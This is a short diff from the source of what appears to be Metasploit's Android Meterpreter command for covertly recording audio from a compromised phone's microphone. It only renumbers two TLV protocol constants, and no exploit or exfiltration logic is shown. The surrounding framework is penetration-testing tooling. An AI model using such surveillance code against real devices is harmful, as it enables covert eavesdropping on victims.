@@ -20,8 +20,8 @@ public class webcam_audio_record_android extends webcam_audio_record implements 
     private static final int AUDIO_CHANNEL_ENCODING = AudioFormat.ENCODING_PCM_16BIT;
 
     private static final int TLV_EXTENSIONS = 20000;
-    private static final int TLV_TYPE_AUDIO_DURATION = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 1);
-    private static final int TLV_TYPE_AUDIO_DATA = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 2);
+    private static final int TLV_TYPE_AUDIO_DURATION = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 10);
+    private static final int TLV_TYPE_AUDIO_DATA = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 11);
 
     public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
